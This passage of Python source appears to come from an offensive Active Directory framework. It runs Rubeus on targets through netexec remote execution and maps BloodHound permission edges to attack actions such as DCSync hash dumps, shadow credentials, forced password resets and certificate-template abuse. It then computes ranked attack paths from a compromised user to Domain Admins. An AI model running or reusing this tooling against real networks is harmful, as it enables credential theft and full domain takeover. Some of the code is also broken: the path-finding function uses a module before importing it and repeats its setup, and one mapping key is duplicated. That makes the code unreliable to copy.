            if os.path.isfile(users): cmd += f' /userfile:{users}'
            else: cmd += f' /user:{users}'
        else:
            cmd = f'{rubeus} {action}'
        hr()
        log(f'Run on target Windows host:', 'info')
        print(f'  {WHITE}{cmd}{RESET}')
        hr()
        nxc = check_tool('netexec','nxc','crackmapexec','cme')
        if nxc:
            run_via = self.ask('run via netexec now?','n',['y','n'])
            if run_via == 'y':
                t_host = self.ask('target',target.dc)
                upload_path = self.ask('Rubeus.exe path on target','C:\\Windows\\Temp\\Rubeus.exe')
                run_cmd([nxc,'smb',t_host]+target.nxc_args(t_host)+['-x',f'{upload_path} {cmd.split(rubeus,1)[1].strip()}'], label=f'Rubeus via netexec')
        hr()

# =============================================================================
# REGISTRY
# =============================================================================

# =============================================================================
# PATHFINDER ENGINE
# =============================================================================

# pathpwn action hints — populated by PathPwn, read by bloody/dcsync modules
_PATHPWN_HINTS: dict = {}

ACE_TO_MODULE = {
    # ── Ownership / DACL ─────────────────────────────────────────────────────
    'GenericAll':              ('bloody',       'resetpwd',    'full control — reset pwd, add to group, shadow creds'),
    'GenericWrite':            ('shadowcred',   'auto',        'shadow credentials or SPN add -> kerberoast'),
    'WriteOwner':              ('bloody',       'writeowner',  'take ownership then grant GenericAll via dacledit'),
    'WriteDacl':               ('aclpersist',   'genericall',  'grant yourself GenericAll via DACL'),
    'Owns':                    ('bloody',       'writeowner',  'owner can grant any right'),
    # ── Credential access ────────────────────────────────────────────────────
    'ForceChangePassword':     ('bloody',       'resetpwd',    'force password reset — no current pw needed'),
    'AllExtendedRights':       ('bloody',       'resetpwd',    'includes ForceChangePassword + cert enrollment'),
    'AddKeyCredentialLink':    ('shadowcred',   'auto',        'shadow credentials -> PKINIT -> NT hash'),
    'ReadLAPSPassword':        ('laps',         '',            'read LAPS local admin password'),
    'ReadGMSAPassword':        ('gmsa',         '',            'read gMSA managed password'),
    # ── Group membership ─────────────────────────────────────────────────────
    'AddMember':               ('bloody',       'addtogroup',  'add owned user to target group'),
    'AddSelf':                 ('bloody',       'addtogroup',  'add yourself to group'),
    'MemberOf':                ('',             '',            'group membership — inherit group rights'),
    # ── DCSync ───────────────────────────────────────────────────────────────
    'GetChangesAll':           ('dcsync',       '',            'DCSync — dump all domain hashes'),
    'GetChanges':              ('dcsync',       '',            'DCSync partial — needs GetChangesAll'),
    'GetChangesInFilteredSet': ('dcsync',       '',            'DCSync filtered set'),
    'DCSync':                  ('dcsync',       '',            'DCSync rights — dump all hashes'),
    # ── Remote access ────────────────────────────────────────────────────────
    'CanPSRemote':             ('exec',         'winrm',       'WinRM / PSRemote shell access'),
    'AdminTo':                 ('exec',         'smb',         'local admin — exec or secretsdump'),
    'CanRDP':                  ('exec',         'smb',         'RDP access — can run commands remotely'),
    'ExecuteDCOM':             ('exec',         'smb',         'DCOM execution — lateral movement'),
    'AllowedToAct':            ('rbcd',         '',            'RBCD — resource-based constrained delegation'),
    'AllowedToDelegate':       ('spnjack',      'ghost',       'constrained delegation target — SPN-Jacking / S4U'),
    # ── Certificate / ADCS ───────────────────────────────────────────────────
    'Enroll':                  ('certipy',      'esc1',        'can enroll in certificate template'),
    'AutoEnroll':              ('certipy',      'find',        'auto-enrollment right on template'),
    'ManageCA':                ('certipy',      'esc7',        'ManageCA — ESC7 via add-officer + enable SubCA'),
    'ManageCertificates':      ('certipy',      'esc7',        'ManageCertificates — approve pending requests'),
    'WriteSPN':                ('spnjack',      'ghost',       'SPN-Jacking — ghost/live/HOST delegation abuse'),
    # ── Container / OU ───────────────────────────────────────────────────────
    'CreateChild':             ('badsuccessor', 'full',        'create object in OU — dMSA/computer creation'),
    'DeleteChild':             ('',             '',            'delete objects in container'),
    'Contains':                ('',             '',            'OU contains object'),
    # ── Trust ────────────────────────────────────────────────────────────────
    'TrustedBy':               ('trusts',       'extrasids',   'domain trust — ExtraSIDs attack possible'),
    'SameForest':              ('trusts',       'enum',        'same forest trust'),
    # ── Misc ─────────────────────────────────────────────────────────────────
    'HasSession':              ('exec',         'smb',         'user has active session on computer'),
    'SQLAdmin':                ('mssql',        'cmd',         'SQL admin rights — xp_cmdshell possible'),
    'HasSIDHistory':           ('trusts',       'sidhistory',  'SID history — may grant cross-domain rights'),
    # ── Additional BloodHound CE edges ───────────────────────────────────────
    'WriteAccountRestrictions': ('bloody',      'setattr',     'write account restrictions — disable preauth, set SPN'),
    'SyncLAPSPassword':         ('laps',        '',            'sync LAPS password — read local admin password'),
    'DumpSMSAPassword':         ('gmsa',        '',            'dump SMSA password'),
    'AddAllowedToAct':          ('rbcd',        '',            'add allowed to act — set RBCD on target'),
    'WriteGPLink':              ('aclpersist',  'gpolink',     'link malicious GPO to OU'),
    'GpLink':                   ('aclpersist',  'gpolink',     'GPO linked to OU — can abuse if editable'),
    'Contains':                 ('',            '',            'OU contains object'),
    'GPOLocalGroup':            ('aclpersist',  'gpolink',     'GPO controls local group membership'),
    'DCFor':                    ('dcsync',      '',            'DC for domain — can DCSync'),
    'IssuedSignedBy':           ('certipy',     'find',        'certificate issued/signed by CA'),
    'EnrollOnBehalfOf':         ('certipy',     'esc3',        'can enroll on behalf of — ESC3 agent'),
    'OIDGroupLink':             ('certipy',     'esc13',       'OID linked to group — ESC13'),
    'ExtendedByPolicy':         ('certipy',     'find',        'extended by issuance policy'),
    'RootCAFor':                ('certipy',     'find',        'root CA for domain'),
    'PublishedTo':              ('certipy',     'find',        'template published to CA'),
    'TrustedForNTAuth':         ('certipy',     'find',        'trusted for NT authentication'),
    'HostsCAService':           ('certipy',     'find',        'hosts CA service'),
    'RemoteInteractiveLogonPrivilege': ('exec', 'rdp',         'remote interactive logon — RDP access'),
}

_DCSYNC   = {'GetChangesAll', 'GetChanges', 'GetChangesInFilteredSet'}
_HV_NAMES = {'DOMAIN ADMINS', 'ENTERPRISE ADMINS', 'ADMINISTRATORS'}

def _load_bh(loot_dir):
    """Load BloodHound JSON files — handles bloodhound-python and rusthound-ce formats.
    rusthound-ce outputs a zip; we extract it first if JSON files not already present."""
    import glob as _gl, json as _js, zipfile as _zf
    d = {'users':[], 'groups':[], 'computers':[], 'domains':[], 'ous':[], 'gpos':[], 'containers':[]}
    bh_dir = os.path.join(loot_dir, 'bloodhound')
    search  = [bh_dir, loot_dir]

    # extract any zips — always overwrite to get latest data
    for base in search:
        if not os.path.isdir(base): continue
        for zp in _gl.glob(os.path.join(base, '*.zip')):
            try:
                with _zf.ZipFile(zp) as z:
                    for name in z.namelist():
                        if name.endswith('.json'):
                            z.extract(name, base)
            except Exception: pass

    patterns = {
        'users':      ['*_users.json','*users*.json'],
        'groups':     ['*_groups.json','*groups*.json'],
        'computers':  ['*_computers.json','*computers*.json'],
        'domains':    ['*_domains.json','*domains*.json'],
        'ous':        ['*_ous.json','*ous*.json'],
        'gpos':       ['*_gpos.json','*gpos*.json'],
        'containers': ['*_containers.json','*containers*.json'],
    }
    for key, pats in patterns.items():
        for base in search:
            if not os.path.isdir(base): continue
            for pat in pats:
                hits = _gl.glob(os.path.join(base, pat))
                for hit in hits:
                    try:
                        raw = _js.load(open(hit))
                        if isinstance(raw, dict):
                            items = raw.get('data', raw.get('nodes', raw.get(key, [])))
                        elif isinstance(raw, list):
                            items = raw
                        else:
                            items = []
                        # filter out non-dict items and items without ObjectIdentifier
                        items = [x for x in items if isinstance(x, dict) and 'ObjectIdentifier' in x]
                        if items:
                            d[key] = items
                            break
                    except Exception: pass
                if d[key]: break
            if d[key]: break
    return d

def _build_graph(data):
    import re as _re
    from collections import defaultdict as _dd
    sn = {}; st = {}
    for u in data['users']:   sn[u['ObjectIdentifier']] = u['Properties']['name'].split('@')[0]; st[u['ObjectIdentifier']] = 'User'
    for g in data['groups']:  sn[g['ObjectIdentifier']] = g['Properties']['name'].split('@')[0]; st[g['ObjectIdentifier']] = 'Group'
    for c in data['computers']: sn[c['ObjectIdentifier']] = c['Properties']['name'].split('@')[0]; st[c['ObjectIdentifier']] = 'Computer'
    dom_sid = None
    for d in data['domains']:
        dom_sid = d['ObjectIdentifier']
        sn[dom_sid] = 'DOMAIN'; st[dom_sid] = 'Domain'

    AR = set(ACE_TO_MODULE.keys())
    adj = _dd(list)

    for obj in data['users'] + data['groups'] + data['computers']:
        to = obj['ObjectIdentifier']
        # handle both flat Aces list and nested IsACLProtected/Aces format
        aces = obj.get('Aces', [])
        if isinstance(aces, dict): aces = aces.get('Results', [])
        for ace in aces:
            rn = ace.get('RightName', ace.get('rightName', ''))
            sid = ace.get('PrincipalSID', ace.get('principalSid', ''))
            if rn in AR and sid:
                adj[sid].append((rn, to))

    for d in data['domains']:
        aces = d.get('Aces', [])
        if isinstance(aces, dict): aces = aces.get('Results', [])
        for ace in aces:
            rn = ace.get('RightName', ace.get('rightName', ''))
            sid = ace.get('PrincipalSID', ace.get('principalSid', ''))
            if rn in AR and sid:
                adj[sid].append((rn, d['ObjectIdentifier']))

    for g in data['groups']:
        for m in g.get('Members', []):
            adj[m['ObjectIdentifier']].append(('MemberOf', g['ObjectIdentifier']))

    def _results(obj, key):
        """Get results list from field that could be dict{'Results':[]} or plain list"""
        v = obj.get(key, [])
        if isinstance(v, dict): return v.get('Results', [])
        if isinstance(v, list): return v
        return []

    for c in data['computers']:
        cid = c['ObjectIdentifier']
        for r in _results(c, 'PSRemoteUsers'):
            if isinstance(r, dict): adj[r['ObjectIdentifier']].append(('CanPSRemote', cid))
        for r in _results(c, 'LocalAdmins'):
            if isinstance(r, dict): adj[r['ObjectIdentifier']].append(('AdminTo', cid))
        for r in _results(c, 'RemoteDesktopUsers'):
            if isinstance(r, dict): adj[r['ObjectIdentifier']].append(('CanRDP', cid))
        for r in _results(c, 'DcomUsers'):
            if isinstance(r, dict): adj[r['ObjectIdentifier']].append(('ExecuteDCOM', cid))
        for r in _results(c, 'AllowedToAct'):
            if isinstance(r, dict): adj[r['ObjectIdentifier']].append(('AllowedToAct', cid))
        for r in _results(c, 'Sessions'):
            if isinstance(r, dict): adj[r.get('ObjectIdentifier','')].append(('HasSession', cid))
        # AllowedToDelegate — constrained delegation
        for d in c.get('AllowedToDelegate', []):
            tgt_sid = d if isinstance(d, str) else d.get('ObjectIdentifier','') if isinstance(d, dict) else ''
            if tgt_sid: adj[cid].append(('AllowedToDelegate', tgt_sid))
        # LocalGroups (rusthound-ce format)
        for lg in c.get('LocalGroups', []):
            if not isinstance(lg, dict): continue
            lg_name = lg.get('Name','').upper()
            edge = 'AdminTo' if 'ADMIN' in lg_name else 'CanPSRemote' if 'REMOTE MANAGEMENT' in lg_name else 'CanRDP' if 'REMOTE DESKTOP' in lg_name else None
            if edge:
                for r in lg.get('Results', []):
                    if isinstance(r, dict): adj[r['ObjectIdentifier']].append((edge, cid))

    # SQL admins
    for u in data['users']:
        _sql = u.get('SQLAdminUsers', [])
        _sql_list = _sql.get('Results', []) if isinstance(_sql, dict) else (_sql if isinstance(_sql, list) else [])
        for d in _sql_list:
            if isinstance(d, dict): adj[u['ObjectIdentifier']].append(('SQLAdmin', d['ObjectIdentifier']))
        # SID History
        for s in u.get('HasSIDHistory', []):
            sid = s if isinstance(s, str) else s.get('ObjectIdentifier','')
            if sid: adj[u['ObjectIdentifier']].append(('HasSIDHistory', sid))

    # Domain trusts
    for dom in data['domains']:
        for t in dom.get('Trusts', []):
            t_sid = t.get('TargetDomainSid','')
            if t_sid:
                adj[dom['ObjectIdentifier']].append(('TrustedBy', t_sid))

    # ADCS — CA permissions (ManageCA, ManageCertificates, Enroll)
    for dom in data['domains']:
        _cas = dom.get('CertificationAuthorities', {})
        _cas_list = _cas if isinstance(_cas, list) else (_cas.get('Results', []) if isinstance(_cas, dict) else [])
        for ca in _cas_list:
            if not isinstance(ca, dict): continue
            ca_sid = ca.get('ObjectIdentifier','')
            if not ca_sid: continue
            sn[ca_sid] = ca.get('Properties',{}).get('name','CA')
            st[ca_sid] = 'CA'
            for ace in ca.get('Aces', []):
                rn = ace.get('RightName','')
                p  = ace.get('PrincipalSID','')
                if rn and p: adj[p].append((rn, ca_sid))

    # ADCS — certificate templates
    for dom in data['domains']:
        _tpls = dom.get('CertificateTemplates', {})
        _tpl_list = _tpls if isinstance(_tpls, list) else (_tpls.get('Results', []) if isinstance(_tpls, dict) else [])
        for tpl in _tpl_list:
            if not isinstance(tpl, dict): continue
            tpl_sid = tpl.get('ObjectIdentifier','')
            if not tpl_sid: continue
            tpl_name = tpl.get('Properties',{}).get('name','Template')
            sn[tpl_sid] = tpl_name
            st[tpl_sid] = 'Template'
            for ace in tpl.get('Aces', []):
                rn = ace.get('RightName','')
                p  = ace.get('PrincipalSID','')
                if rn and p: adj[p].append((rn, tpl_sid))

    # GPOs — check for WriteGPLink, GpLink
    for dom in data['domains']:
        _gpos = dom.get('GPOs', {})
        _gpo_list = _gpos if isinstance(_gpos, list) else (_gpos.get('Results', []) if isinstance(_gpos, dict) else [])
        for gpo in _gpo_list:
            if not isinstance(gpo, dict): continue
            gpo_sid = gpo.get('ObjectIdentifier','')
            if not gpo_sid: continue
            sn[gpo_sid] = gpo.get('Properties',{}).get('name','GPO')
            st[gpo_sid] = 'GPO'
            for ace in gpo.get('Aces', []):
                rn = ace.get('RightName','')
                p  = ace.get('PrincipalSID','')
                if rn and p: adj[p].append((rn, gpo_sid))

    # OUs — load from dedicated ous list (rusthound-ce *_ous.json) + domain object fallback
    ou_list = list(data.get('ous', []))
    # also check domain object for embedded OUs (bloodhound-python format)
    for dom in data['domains']:
        _ous = dom.get('OUs', {})
        _embedded = _ous if isinstance(_ous, list) else (_ous.get('Results', []) if isinstance(_ous, dict) else [])
        for ou in _embedded:
            if isinstance(ou, dict) and ou.get('ObjectIdentifier') not in {o.get('ObjectIdentifier') for o in ou_list}:
                ou_list.append(ou)

    # Build OU containment map: ou_sid -> set of direct child SIDs
    ou_children = {}
    ou_by_dn    = {}

    for ou in ou_list:
        if not isinstance(ou, dict): continue
        ou_sid = ou.get('ObjectIdentifier','')
        if not ou_sid: continue
        ou_name = ou.get('Properties',{}).get('name', ou.get('Properties',{}).get('distinguishedname','OU'))
        dn      = ou.get('Properties',{}).get('distinguishedname','')
        sn[ou_sid] = ou_name.split(',')[0].replace('OU=','') if ',' in ou_name else ou_name
        st[ou_sid] = 'OU'
        if dn: ou_by_dn[dn.upper()] = ou_sid
        ou_children.setdefault(ou_sid, set())
        for child in ou.get('ChildObjects', []):
            if not isinstance(child, dict): continue
            child_sid = child.get('ObjectIdentifier','')
            if child_sid: ou_children[ou_sid].add(child_sid)

    # enrich OU children via DN parent matching for users/groups/computers
    for obj in data['users'] + data['groups'] + data['computers']:
        if not isinstance(obj, dict): continue
        obj_sid = obj.get('ObjectIdentifier','')
        obj_dn  = obj.get('Properties',{}).get('distinguishedname','').upper()
        if not obj_sid or not obj_dn: continue
        parent_dn = ','.join(obj_dn.split(',')[1:])
        if parent_dn in ou_by_dn:
            ou_children.setdefault(ou_by_dn[parent_dn], set()).add(obj_sid)

    def _descendants(ou_sid, _seen=None):
        if _seen is None: _seen = set()
        if ou_sid in _seen: return set()
        _seen.add(ou_sid)
        out = set()
        for c in ou_children.get(ou_sid, set()):
            out.add(c)
            if st.get(c) == 'OU':
                out |= _descendants(c, _seen)
        return out

    INHERIT = {'GenericAll','WriteDACL','GenericWrite','WriteOwner','Owns',
               'ForceChangePassword','ResetPassword','AddMember','AddSelf',
               'WriteAccountRestrictions','WriteSPN','AllExtendedRights'}

    for ou in ou_list:
        if not isinstance(ou, dict): continue
        ou_sid = ou.get('ObjectIdentifier','')
        if not ou_sid: continue
        for ace in ou.get('Aces', []):
            if not isinstance(ace, dict): continue
            rn = ace.get('RightName','')
            p  = ace.get('PrincipalSID','')
            if not rn or not p: continue
            adj[p].append((rn, ou_sid))
            if rn in INHERIT:
                for desc in _descendants(ou_sid):
                    dtype = st.get(desc,'')
                    if rn in ('ForceChangePassword','ResetPassword') and dtype != 'User': continue
                    if rn in ('AddMember','AddSelf') and dtype != 'Group': continue
                    if rn == 'WriteSPN' and dtype not in ('User','Computer'): continue
                    adj[p].append((rn, desc))
        for gp in ou.get('Links', []):
            if not isinstance(gp, dict): continue
            gp_sid = gp.get('GUID','') or gp.get('ObjectIdentifier','')
            if gp_sid: adj[ou_sid].append(('GpLink', gp_sid))

    # GPOs — load from dedicated gpos list
    gpo_list = list(data.get('gpos', []))
    for gpo in gpo_list:
        if not isinstance(gpo, dict): continue
        gpo_sid = gpo.get('ObjectIdentifier','')
        if not gpo_sid: continue
        sn[gpo_sid] = gpo.get('Properties',{}).get('name','GPO')
        st[gpo_sid] = 'GPO'
        for ace in gpo.get('Aces', []):
            if not isinstance(ace, dict): continue
            rn = ace.get('RightName','')
            p  = ace.get('PrincipalSID','')
            if rn and p: adj[p].append((rn, gpo_sid))

    # Computer — additional fields
    for c in data['computers']:
        # LAPS
        if c.get('Properties',{}).get('haslaps') or c.get('LAPSEnabled'):
            sn[c['ObjectIdentifier']] = sn.get(c['ObjectIdentifier'], c['Properties']['name'].split('@')[0])
        # AllowedToDelegate per computer
        for tgt in c.get('AllowedToDelegate', []):
            tgt_sid = tgt if isinstance(tgt, str) else tgt.get('ObjectIdentifier','')
            if tgt_sid: adj[c['ObjectIdentifier']].append(('AllowedToDelegate', tgt_sid))

    # User — additional fields
    for u in data['users']:
        # RemoteInteractiveLogon
        for r in u.get('RemoteInteractiveLogonPrivileges', {}).get('Results', []):
            adj[u['ObjectIdentifier']].append(('RemoteInteractiveLogonPrivilege', r['ObjectIdentifier']))

    hv = {dom_sid} if dom_sid else set()
    for g in data['groups']:
        if g['Properties']['name'].split('@')[0].upper() in _HV_NAMES:
            hv.add(g['ObjectIdentifier'])

    return adj, sn, st, hv, dom_sid

def _edge_weight(right, src_type, dst_type):
    """Edge weights based on autobloody's approach — lower = prefer this path.
    Weights reflect exploitation difficulty and reliability."""
    # DCSync-enabling edges on domain — best paths
    if right in ('GetChangesAll',) and dst_type in ('Domain','domain'):
        return 1
    if right in ('WriteDacl','WriteOwner') and dst_type in ('Domain','domain'):
        return 2
    if right in ('GenericAll','Owns','AllExtendedRights') and dst_type in ('Domain','domain'):
        return 3
    # Group membership — free, just inherit rights
    if right == 'MemberOf':
        return 1
    # Strong rights on groups
    if right in ('AddMember','AddSelf') and dst_type in ('Group','group'):
        return 2
    if right in ('GenericAll','GenericWrite') and dst_type in ('Group','group'):
        return 3
    if right == 'WriteDacl' and dst_type in ('Group','group'):
        return 3
    # Rights on users
    if right == 'ForceChangePassword':
        return 4
    if right in ('GenericAll','GenericWrite','WriteOwner') and dst_type in ('User','user'):
        return 4
    # Computer rights
    if right in ('AdminTo','CanPSRemote','CanRDP') and dst_type in ('Computer','computer'):
        return 5
    if right in ('AllowedToAct','GenericAll') and dst_type in ('Computer','computer'):
        return 5
    # Partial DCSync — needs both GetChanges AND GetChangesAll, avoid unless combined
    if right == 'GetChanges':
        return 50
    # Certificate / shadow creds paths
    if right in ('AddKeyCredentialLink','ManageCA','ManageCertificates'):
        return 6
    # Fallback
    return 10


def _dijkstra_paths(starts, adj, hv, sn, st, max_depth=10):
    """Dijkstra shortest path weighted by exploitation difficulty.
    Returns list of paths sorted by total weight (best first)."""
    import heapq as _hq

    _COMPROMISE = {'GenericAll','AllExtendedRights','ForceChangePassword','Owns',
                   'WriteDacl','WriteOwner','AddKeyCredentialLink','GenericWrite',
                   'AdminTo','CanPSRemote','CanRDP','AllowedToAct','ManageCA',
                   'ManageCertificates','SQLAdmin','AddMember','AddSelf',
                   'WriteAccountRestrictions','GetChangesAll'}

    # heap: (cost, path_as_list_of_(node,right,prev))
    heap = []
    for s in starts:
        heapq.heappush(heap, (0, id([]), [(s, None, None)]))

    visited = {}  # node → best cost seen
    found   = []

    import heapq
    heap = []
    for s in starts:
        heapq.heappush(heap, (0, [(s, None, None)]))

    visited = {}

    while heap:
        cost, path = heapq.heappop(heap)
        cur = path[-1][0]

        if len(path) > max_depth:
            continue

        if cur in visited and visited[cur] <= cost:
            continue
        visited[cur] = cost

        if cur in hv:
            found.append((cost, path))
            continue

        for right, nxt in adj.get(cur, []):
            src_type = st.get(cur, '')
            dst_type = st.get(nxt, '')
            w = _edge_weight(right, src_type, dst_type)
            new_cost = cost + w
            new_path = path + [(nxt, right, cur)]

            if nxt not in visited or visited[nxt] > new_cost:
                heapq.heappush(heap, (new_cost, new_path))

            # compromise expansion — if we can take over nxt, explore its edges too
            if right in _COMPROMISE and nxt not in visited:
                heapq.heappush(heap, (new_cost, new_path))

    # sort by cost then length, return top paths
    found.sort(key=lambda x: (x[0], len(x[1])))
    return [path for cost, path in found[:10]]


def _bfs_paths(starts, adj, hv, sn, max_depth=8):
    """BFS fallback — kept for compatibility. Prefer _dijkstra_paths."""
    from collections import deque as _dq
    _COMPROMISE = {'GenericAll','AllExtendedRights','ForceChangePassword','Owns','WriteDacl','WriteOwner','AddKeyCredentialLink','GenericWrite','AdminTo','CanPSRemote','CanRDP','AllowedToAct','ManageCA','ManageCertificates','SQLAdmin','AddMember','AddSelf','WriteAccountRestrictions'}
    visited = set(starts)
    queue   = _dq()
    for s in starts: queue.append([(s, None, None)])
    found = []
    while queue:
        path = queue.popleft()
        cur  = path[-1][0]
        if len(path) > max_depth: continue
        for right, nxt in adj[cur]:
            new_path = path + [(nxt, right, cur)]
            if nxt in hv:
                found.append(new_path)
                continue
            if nxt not in visited:
                visited.add(nxt)
                queue.append(new_path)
                if right in _COMPROMISE:
                    queue.append(new_path)
    return sorted(found, key=len)


def _fmt_steps(path, sn, st=None):
    """Format path steps. st = sid->type dict for smart action selection."""
    steps = []
    for i, (node, right, prev) in enumerate(path):
        if right is None: continue
        # smart action: GenericAll on Group → addtogroup, on User → resetpwd
        mod, act, desc = ACE_TO_MODULE.get(right, ('','',right))
        if right == 'GenericAll' and st:
            obj_type = st.get(node, '')
            if obj_type == 'Group':
                act  = 'addtogroup'
                desc = 'add yourself to group — inherit group rights'
            elif obj_type == 'Computer':
                act  = 'setattr'
                desc = 'GenericAll on computer — shadow creds or RBCD'
        if right == 'WriteDacl' and st:
            obj_type = st.get(node, '')
            if obj_type == 'Domain':
                act  = 'dcsync-rights'
                desc = 'grant DCSync rights to owned user via WriteDACL'
                mod  = 'aclpersist'
        steps.append({'step':i,'from':sn.get(prev,prev[:20] if prev else '?'),
                      'right':right,'to':sn.get(node,node[:20]),
                      'to_type': st.get(node,'') if st else '',
                      'module':mod,'action':act,'desc':desc})
    return steps


class Pathfind(Module):
    name='pathfind'; description='parse BloodHound data — find shortest attack path to DA'; category='recon'
    def run(self, target):
        hr()
        log('Loading BloodHound data from loot/bloodhound/...', 'info')
        data, adj, sn, st, hv, dom_sid = get_bh_data(target.loot_dir)
        if not data['users']:
            log(f'No BloodHound JSON found — run {C0}adrecon{RESET} first', 'error'); hr(); return
        log(f'{WHITE}{len(data["users"])} users  {len(data["groups"])} groups  {len(data["computers"])} computers  {len(data.get("ous",[]))} OUs  {len(data.get("gpos",[]))} GPOs{RESET}', 'info')


        owned = self.ask('owned user', target.user or '')
        def _match_user(u, q):
            q = q.upper()
            name = u['Properties'].get('name','').upper()
            sam  = u['Properties'].get('samaccountname', u['Properties'].get('SamAccountName','')).upper()
            return (name == q or name.split('@')[0] == q or
                    sam == q or sam.split('@')[0] == q or
                    q in name)
        owned_sid = next((u['ObjectIdentifier'] for u in data['users'] if _match_user(u, owned)), None)
        if not owned_sid:
            # show clean user names only (skip SID-style, health mailboxes, built-ins)
            skip = {'GUEST','KRBTGT','DEFAULTACCOUNT','ADMINISTRATOR'}
            names = sorted(set(
                u['Properties'].get('samaccountname',
                u['Properties'].get('SamAccountName',
                u['Properties'].get('name',''))).split('@')[0]
                for u in data['users']
                if not u['Properties'].get('name','').startswith('$')
                and u['Properties'].get('samaccountname',
                    u['Properties'].get('name','')).upper().split('@')[0] not in skip
                and 'HEALTHMAILBOX' not in u['Properties'].get('name','').upper()
            ))
            log(f'User {WHITE}{owned}{RESET} not found — available users:', 'error')
            print('  ' + '  '.join(names))
            owned = self.ask('owned user', names[0] if names else '')
            if not owned: hr(); return
            owned_sid = next((u['ObjectIdentifier'] for u in data['users'] if _match_user(u, owned)), None)
            if not owned_sid:
                log(f'Still not found','error'); hr(); return
        log(f'Pathfinding from {WHITE}{owned}{RESET}...', 'info')

        # expand start to include groups owned user is in
        starts = {owned_sid}
        for r, t in adj[owned_sid]:
            if r == 'MemberOf': starts.add(t)

        paths = _dijkstra_paths(starts, adj, hv, sn, st)

        if not paths:
            log('No paths to high-value targets — showing direct outbound edges', 'warn')
            # find most actionable edge for next step hint
            _edge_priority = [
                'GenericAll','WriteDacl','WriteOwner','Owns',
                'AddKeyCredentialLink','ForceChangePassword','AllExtendedRights',
                'GenericWrite','AddMember','AddSelf',
                'GetChangesAll','GetChanges',
                'CanPSRemote','AdminTo',
            ]
            edges = [(right, t) for right, t in adj[owned_sid] if right != 'MemberOf']
            best_edge = next((e for p in _edge_priority for e, _ in edges if e == p), None)
            _edge_detail = f'{best_edge} on {sn.get(edges[0][1], "?")[:12]}' if best_edge else f'edges from {owned}'
            add_result('pathfind', _edge_detail)
            import shutil as _sh2
            W2 = min(_sh2.get_terminal_size().columns - 4, 76)
            print()
            edges = [(right, t) for right, t in adj[owned_sid] if right != 'MemberOf']
            members = [(right, t) for right, t in adj[owned_sid] if right == 'MemberOf']
            all_edges = edges + members
            if all_edges:
                # render as a single box
                bc = '\033[38;2;80;100;115m'
                lbl = f' outbound edges from {owned} '
                right_pad = max(0, W2 - 2 - len(lbl) - 2)
                print(f'  {bc}┌─{lbl}{"─" * right_pad}┐{RESET}')
                for i, (right, t) in enumerate(all_edges):
                    if i > 0: print(f'  {bc}├{"─" * (W2-2)}┤{RESET}')
                    _rcol2 = lambda r: (PINK if r in ('GetChangesAll','GetChanges','GetChangesInFilteredSet') else
                                         RED if r in ('GenericAll','WriteDacl','WriteOwner','Owns') else
                                         ORANGE if r in ('ForceChangePassword','AllExtendedRights','GenericWrite','AddMember','AddSelf') else
                                         GREEN if r in ('CanPSRemote','AdminTo') else
                                         PURPLE if r == 'AddKeyCredentialLink' else C1)
                    rc = _rcol2(right) if right != 'MemberOf' else GREY
                    mod, act, desc = ACE_TO_MODULE.get(right, ('','',''))
                    to_name = sn.get(t, t)[:22]
                    frm_name = owned[:20]
                    print(f'  {bc}│{RESET} {GREY}{i+1:02d}  {rc}{right}{RESET}')
                    print(f'  {bc}│{RESET}     {WHITE}{frm_name:<22}{GREY}──────────────▶{RESET}  {WHITE}{to_name}{RESET}')
                    if mod: print(f'  {bc}│{RESET}     {C0}→ run {mod}{RESET}  {GREY}{act}{RESET}')
                print(f'  {bc}└{"─" * (W2-2)}┘{RESET}')
            hr(); return

        import shutil as _sh
        cols = _sh.get_terminal_size().columns
        BOX  = min(cols - 4, 76)

        hr()
        print(f'\n  {C0}{BOLD}attack paths{RESET}  {GREY}{len(paths)} found{RESET}\n')
        # extract first actionable edge from shortest path for next step hint
        _first_edge = paths[0][1] if paths and len(paths[0]) > 1 else None
        _path_detail = f'{_first_edge} → DA' if _first_edge else f'{len(paths)} path(s) to DA'
        add_result('pathfind', _path_detail)

        def _rcol(right):
            if right in ('GetChangesAll','GetChanges','GetChangesInFilteredSet','DCSync'): return PINK
            if right in ('GenericAll','WriteDacl','WriteOwner','Owns','ManageCA','ManageCertificates'): return RED
            if right in ('ForceChangePassword','AllExtendedRights','AddKeyCredentialLink'): return ORANGE
            if right in ('GenericWrite','AddMember','AddSelf','WriteSPN','HasSIDHistory'):  return ORANGE
            if right in ('CanPSRemote','AdminTo','CanRDP','ExecuteDCOM','SQLAdmin'):        return GREEN
            if right in ('AllowedToDelegate','AllowedToAct','Enroll','ManageCertificates'): return C1
            if right == 'AddKeyCredentialLink':                                   return PURPLE
            return C1

        def _bar_col(right):
            if right in ('GetChangesAll','GetChanges','GetChangesInFilteredSet'): return '\033[38;2;255;110;180m'
            if right in ('GenericAll','WriteDacl','WriteOwner','Owns'):           return '\033[38;2;255;77;106m'
            if right in ('ForceChangePassword','AllExtendedRights','GenericWrite','AddMember','AddSelf'): return '\033[38;2;255;140;66m'
            if right in ('CanPSRemote','AdminTo'):                                return '\033[38;2;40;200;64m'
            if right == 'AddKeyCredentialLink':                                   return '\033[38;2;160;122;255m'
            return C1

        import shutil as _sh
        cols = _sh.get_terminal_size().columns
        W    = min(cols - 4, 74)  # box width

        def _box_line(content='', pad=True):
            """Print a line inside the box borders."""
            inner = W - 2  # space between │ chars
            visible = len(content.encode('ascii', errors='ignore'))
            # strip ansi for length calculation
            plain = len(re.sub(r'\033\[[^m]*m', '', content))
            spaces = max(0, inner - plain) if pad else 0
            print(f'  \033[38;2;80;100;115m│\033[0m {content}{" " * spaces} \033[38;2;80;100;115m│\033[0m')

        def _box_top(label='', bc='\033[38;2;80;100;115m'):
            inner = W - 2
            lbl   = f' {label} ' if label else ''
            right = max(0, inner - len(lbl) - 2)
            print(f'  {bc}┌─{lbl}{"─" * right}┐{RESET}')

        def _box_mid(bc='\033[38;2;80;100;115m'):
            print(f'  {bc}├{"─" * (W-2)}┤{RESET}')

        def _box_bot(bc='\033[38;2;80;100;115m'):
            print(f'  {bc}└{"─" * (W-2)}┘{RESET}')

        for pi, path in enumerate(paths[:3]):
            steps  = _fmt_steps(path, sn, st)
            attack = [s for s in steps if s['right'] != 'MemberOf']
            n      = len(attack)
            suffix = '  shortest' if pi == 0 else ''
            bc     = _bar_col(attack[0]['right']) if attack else '\033[38;2;80;100;115m'

            # box header
            hdr = f'{C0}path {pi+1}{RESET}  {GREY}{n} hop{"s" if n!=1 else ""}{suffix}{RESET}'
            _box_top(f'path {pi+1}  {n} hop{"s" if n!=1 else ""}{suffix}')

            for i, s in enumerate(attack):
